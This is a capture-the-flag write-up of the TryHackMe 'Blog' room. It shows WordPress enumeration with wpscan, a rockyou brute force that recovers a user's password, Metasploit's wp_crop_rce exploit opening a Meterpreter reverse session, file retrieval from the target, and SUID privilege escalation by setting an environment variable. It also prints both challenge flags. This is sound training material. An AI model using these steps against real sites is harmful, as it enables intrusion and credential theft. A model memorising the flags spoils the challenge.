---
title: "TryHackMe - Blog"
date: 2025-03-26 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [wordpress, exploitation, metasploit, brute force]

---

## Introduction

Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...

## Reconnaissance

```console
> nmap -sC -sV -Pn blog.thm  
```
```console
> wpscan --url http://www.blog.thm 
```

## Exploitation
From the scans, I learn that the WordPress version is 5.0, and I launch Metasploit in search of ready-made exploits.


```console
> msfconsole
> search wordpress 5.0
```

I see several potential exploits to use.


```yaml
0   exploit/multi/http/wp_crop_rce                           2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
   1   exploit/unix/webapp/wp_property_upload_exec              2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability
   2   exploit/multi/http/wp_plugin_fma_shortcode_unauth_rce    2023-05-31       excellent  Yes    Wordpress File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution through shortcode
   3     \_ target: PHP                                         .                .          .      .
   4     \_ target: Unix Command                                .                .          .      .
   5     \_ target: Linux Dropper                               .                .          .      .
   6     \_ target: Windows Command                             .                .          .      .
   7     \_ target: Windows Dropper                             .                .          .      .
   8   exploit/multi/http/wp_litespeed_cookie_theft             2024-09-04       excellent  Yes    Wordpress LiteSpeed Cache plugin cookie theft
   9     \_ target: PHP In-Memory                               .                .          .      .
   10    \_ target: Unix In-Memory                              .                .          .      .
   11    \_ target: Windows In-Memory                           .                .          .      .
   12  auxiliary/scanner/http/wp_woocommerce_payments_add_user  2023-03-22       normal     Yes    Wordpress Plugin WooCommerce Payments Unauthenticated Admin Creation
   13  auxiliary/scanner/http/wp_registrationmagic_sqli         2022-01-23       normal     Yes    Wordpress RegistrationMagic task_ids Authenticated SQLi

```

In this case, I decide to use **exploit/multi/http/wp_crop_rce**. However, to run it, I will need the username and password of the user.

```yaml
Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    *yes*      The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-me
                                         tasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THEME_DIR                   no        The WordPress theme dir name (disable theme auto-detection if pro
                                         vided)
   USERNAME                    *yes*       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


```

I use this again with **wpscan** 

```console
> wpscan --url blog.thm -P /usr/share/wordlists/rockyou.txt
```

I find two users: **kwheel** and **bjoel** 


```yaml
[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

```

I will now try to obtain the password for this account using the bruteforce method. I can do this in several ways, for example by using **Hydra**, but in this case, I decided to stick with **WPScan**.

```console
> wpscan --url blog.thm --usernames kwheel --passwords /usr/share/wordlists/rockyou.txt 
```

After a short while, I manage to obtain the password using the bruteforce method.

```yaml
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kwheel / cutiepie1                                                                              
Trying kwheel / westham Time: 00:01:52 <                           > (2865 / 14347257)  0.01%  ETA: ??:??:??
```

I return to Metasploit to complete the exploit configuration.

```console
> set RHOST [MACHINE_IP]
> set LHOST [MY_IP]
> set password cutiepie1
> set username kwheel
```

and I run it

```console
> exploit
```
It was successful.
```yaml
[*] Meterpreter session 1 opened (10.8.x.x:4444 -> 10.10.x.x32870) at 2025-03-26 09:00:46 -0400
```

I check if I can use commands through Meterpreter : 

```yaml
meterpreter > getuid
Server username: www-data
meterpreter > sysinfo
Computer    : blog
OS          : Linux blog 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64
Meterpreter : php/linux
```

Everything looks fine, so I proceed to the regular system shell

```console
> shell
> script -qc /bin/bash /dev/null
```

I proceed to search the users' files for flags. I find the file **user.txt** in the bjoel directory, but it is not what I'm looking for. There is also a .pdf file here


```yaml
www-data@blog:/home/bjoel$ ls
ls
Billy_Joel_Termination_May20-2020.pdf  user.txt
www-data@blog:/home/bjoel$ cat user.txt
cat user.txt
You won't find what you're looking for here.

TRY HARDER

```

I start a simple Python server on the target machine to download the .pdf file to my computer

```console
> python3 -m http.server
```

and 

```console
> wget http://blog.thm:8000/Billy_Joel_Termination_May20-2020.pdf
```
on my machine.

```yaml
--2025-03-26 09:15:11--  http://blog.thm:8000/Billy_Joel_Termination_May20-2020.pdf
Resolving blog.thm (blog.thm)... 10.10.73.119
Connecting to blog.thm (blog.thm)|10.10.73.119|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 69106 (67K) [application/pdf]
Saving to: ‘Billy_Joel_Termination_May20-2020.pdf’

Billy_Joel_Termination_May 100%[========================================>]  67.49K   160KB/s    in 0.4s    

2025-03-26 09:15:11 (160 KB/s) - ‘Billy_Joel_Termination_May20-2020.pdf’ saved [69106/69106]

```

From the email content, I learn that Billy Joel has been fired

```
You have been terminated for the following reasons:
• Repeated offenses regarding company removable media policy
• Repeated offenses regarding company Acceptable Use Policy
• Repeated offenses regarding tardiness
```

## Privilege Escalation
I proceed with the privilege escalation attempt. The first step is to search for SUID files that I can use for escalation.

```console
> find / -perm -u=s -type f 2>/dev/null
```

Among the list of files, my attention was drawn to :

**/usr/sbin/checker**

I try to run it

```console
> usr/sbin/checker
```

However, the program tells me that I am not an administrator

```yaml
/usr/sbin/checker
Not an Admin
```

I analyze the code using the tool **ltrace**

```console
 > ltrace /usr/sbin/checker
 ```
```yaml
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++

```

**getenv("admin) = nil** this means that the **admin** environment variable does not exist at the moment in the process environment. I try to set the admin environment variable manually to attempt to gain administrator privileges.

```bash
> export admin=true
```

And I run the program again.

I have root privileges!

I search through the files on the machine to find and read the flags.

```yaml
root@blog:/# find / -type f -name "user.txt" 2>/dev/null
find / -type f -name "user.txt" 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
```

and 

```console
find / -type f -name "root.txt" 2>/dev/null
```


<br>**user.txt :** c8421899aae571f7af486492b71a8ab7 
<br>**root.txt:**  9a0b2b618bef9bfa7ac28c1353d9f318





During my research, I found a very interesting article about exploiting WordPress sites, which I will post here for future reference.
https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html#xml-rpc